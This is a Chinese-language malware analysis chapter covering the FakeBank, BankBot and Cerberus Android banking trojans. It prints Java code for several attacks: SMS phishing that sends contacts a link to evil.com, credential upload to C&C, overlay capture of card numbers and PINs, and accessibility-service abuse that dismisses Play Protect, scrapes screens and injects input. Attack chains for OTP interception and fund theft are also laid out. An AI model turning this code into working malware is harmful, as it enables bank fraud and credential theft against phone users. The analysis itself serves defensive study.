# 银行木马深度分析

### 6.1 FakeBank 分析

FakeBank 是早期 Android 银行木马家族之一，主要通过短信钓鱼传播。

```java
// FakeBank 核心行为分析（反编译代码）

// 1. 钓鱼短信传播
public class SmsSpreader {
    void sendPhishingSms() {
        // 从通讯录获取目标号码
        Cursor cursor = getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null);

        while (cursor.moveToNext()) {
            String phone = cursor.getString(
                cursor.getColumnIndex(Phone.NUMBER));
            // 发送钓鱼短信
            SmsManager.getDefault().sendTextMessage(phone, null,
                "【银行通知】您的账户存在风险，请点击 http://evil.com/bank 验证",
                null, null);
        }
    }
}

// 2. 钓鱼页面
public class PhishingActivity extends Activity {
    void showPhishingPage() {
        // 模拟银行登录界面
        setContentView(R.layout.fake_bank_login);
        // 用户输入的账号密码会被窃取
        EditText accountInput = findViewById(R.id.account);
        EditText passwordInput = findViewById(R.id.password);
        Button submitButton = findViewById(R.id.submit);

        submitButton.setOnClickListener(v -> {
            String account = accountInput.getText().toString();
            String password = passwordInput.getText().toString();
            // 上传到 C&C
            uploadCredentials(account, password);
        });
    }
}
```

**FakeBank 行为链**：

```
传播阶段：
  短信钓鱼 → 用户点击链接 → 下载 APK → 安装运行
  ↓
激活阶段：
  启动无图标 Activity → 隐藏在后台 → 注册短信拦截器
  ↓
信息窃取阶段：
  读取通讯录 → 向通讯录发送钓鱼短信（蠕虫传播）
  ↓
凭证窃取阶段：
  弹出银行登录界面 → 用户输入凭证 → 上传到 C&C
  ↓
验证码截获阶段：
  拦截银行验证码短信 → 上传到 C&C → 攻击者完成转账
```

### 6.2 BankBot 分析

BankBot 是商业化的银行木马家族，使用 Overlay 攻击窃取银行凭证。

```java
// BankBot Overlay 攻击分析

// 1. 监控前台应用
public class OverlayService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // 获取 WindowManager
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);

        // 监听前台应用变化
        AccessibilityServiceCompat.observe((event) -> {
            String foregroundApp = event.getPackageName().toString();

            // 检查是否为银行应用
            if (BANK_PACKAGES.contains(foregroundApp)) {
                // 显示 Overlay 界面
                showOverlayWindow(wm, foregroundApp);
            }
        });
        return START_STICKY;
    }

    void showOverlayWindow(WindowManager wm, String bankPackage) {
        // 创建 Overlay View
        View overlay = LayoutInflater.from(this)
            .inflate(R.layout.overlay_bank_login, null);

        // TYPE_APPLICATION_OVERLAY (Android 8.0+)
        int layoutType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            layoutType,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            PixelFormat.TRANSLUCENT
        );

        // 显示覆盖窗口
        wm.addView(overlay, params);

        // 模拟银行登录界面
        EditText cardNumber = overlay.findViewById(R.id.card_number);
        EditText pin = overlay.findViewById(R.id.pin);
        overlay.findViewById(R.id.confirm).setOnClickListener(v -> {
            // 窃取输入信息
            String card = cardNumber.getText().toString();
            String pinCode = pin.getText().toString();
            uploadToC2("card=" + card + "&pin=" + pinCode);
            // 移除 Overlay
            wm.removeView(overlay);
        });
    }
}
```

### 6.3 Cerberus 分析

Cerberus 是 2019-2020 年活跃的银行木马，通过滥用无障碍服务（Accessibility Service）实现高级攻击。

```
Cerberus 攻击链深度分析：

阶段1：分发
├── 隐藏在合法应用中（如电池优化、Flash Player 等）
├── 通过第三方应用商店和钓鱼网站分发
└── 部分版本通过覆盖 Google Play 应用传播

阶段2：激活
├── 安装后请求无障碍服务权限
├── 使用社会工程话术诱导用户开启：
│   "为了更好的使用体验，请开启无障碍服务"
├── 获取无障碍权限后，自动授予其他权限
└── 设置设备管理器防止卸载

阶段3：核心恶意行为
├── 无障碍服务滥用：
│   ├── 读取屏幕上所有文本内容（包括银行应用界面）
│   ├── 模拟点击和输入（自动填写钓鱼页面）
│   ├── 拦截 Google Play Protect 安全弹窗
│   └── 自动授予自身额外权限
├── 短信拦截：
│   ├── 获取 OTP 验证码
│   ├── 上传验证码到 C&C
│   └── 阻止短信到达用户
├── Overlay 攻击：
│   ├── 检测银行应用在前台运行
│   ├── 显示高仿真钓鱼界面
│   └── 利用无障碍服务自动操作
└── 数据窃取：
    ├── 通讯录
    ├── 应用列表（安装的银行应用）
    ├── 设备信息（IMEI、Android 版本等）
    └── 通知内容（银行推送通知中的验证码）

阶段4：C&C 通信
├── 使用 HTTP POST 到 C&C 服务器
├── 加密通信内容（AES + Base64）
├── 心跳保活机制
└── 接收远程指令执行

阶段5：变现
├── 使用窃取的银行凭证登录
├── 利用截获的 OTP 完成转账
├── 绕过银行风控（使用受害者设备 IP 和设备指纹）
└── 资金转移到攻击者账户
```

```java
// Cerberus Accessibility Service 核心逻辑
public class MaliciousAccessibilityService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        CharSequence pkgName = event.getPackageName();

        // 1. 拦截安全弹窗（阻止 Google Play Protect 卸载）
        if ("com.google.android.gms".equals(pkgName)) {
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                // 自动点击 "禁用" 或 "取消"
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
        }

        // 2. 读取银行应用界面内容
        if (BANK_PACKAGES.contains(pkgName.toString())) {
            // 获取屏幕上所有文本
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            String screenContent = extractAllText(rootNode);
            // 上传界面内容到 C&C
            uploadToC2("screen=" + encodeBase64(screenContent));
        }

        // 3. 自动操作（模拟点击/输入）
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            // 查找输入框并填入攻击者控制的值
            AccessibilityNodeInfo inputField = findInputField(rootNode);
            if (inputField != null) {
                // 模拟在输入框中填入攻击者指定的内容
                Bundle args = new Bundle();
                args.putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    attackerControlledText);
                inputField.performAction(
                    AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            }
        }
    }

    // 递归提取所有文本
    private String extractAllText(AccessibilityNodeInfo node) {
        StringBuilder sb = new StringBuilder();
        if (node != null) {
            if (node.getText() != null) {
                sb.append(node.getText()).append("\n");
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                sb.append(extractAllText(node.getChild(i)));
            }
        }
        return sb.toString();
    }
}
```
